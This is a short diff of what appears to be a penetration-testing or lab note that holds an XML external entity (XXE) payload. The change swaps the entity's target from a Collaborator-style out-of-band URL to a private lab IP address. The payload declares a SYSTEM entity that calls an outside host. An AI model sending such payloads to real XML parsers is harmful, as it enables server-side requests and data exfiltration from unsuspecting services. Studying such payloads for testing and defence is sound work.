@@ -14,7 +14,7 @@
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "<http://collaborator-url.oastify.com>">
+  <!ENTITY xxe SYSTEM "<http://10.10.16.180>">
 ]>
 <foo>&xxe;</foo>
 
